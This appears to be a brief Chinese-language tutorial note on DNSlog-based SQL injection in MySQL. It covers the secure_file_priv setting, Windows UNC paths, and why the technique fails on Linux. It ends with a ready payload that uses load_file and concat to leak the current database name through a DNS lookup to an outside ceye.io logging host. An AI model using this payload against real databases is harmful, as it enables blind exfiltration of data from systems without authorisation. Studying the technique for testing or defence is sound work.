mysql下的dnslog注入：
1.利用条件：secure_file_priv 不能为NULL,任何不可读写

2.仅支持 Windows但不支持 Linux。
原因：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——UNC路径。
> UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。
平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：`\\sss.xxx\test\`\
这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。

```
配置读写权限：
--secure-file-priv = null  //任何不可读写
--secure-file-priv =        //任何可读写
--secure-file-priv = c:\   //只有C盘可读写
在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
查看配置：
show variables like '%secure%';


读文件：
select load_file('/sql.txt');
and load_file(concat(‘\\\\’,(select database()),’.xtftm5.ceye.io\\sql’)); 
# windows才支持的路径无回显DNSlog携带

```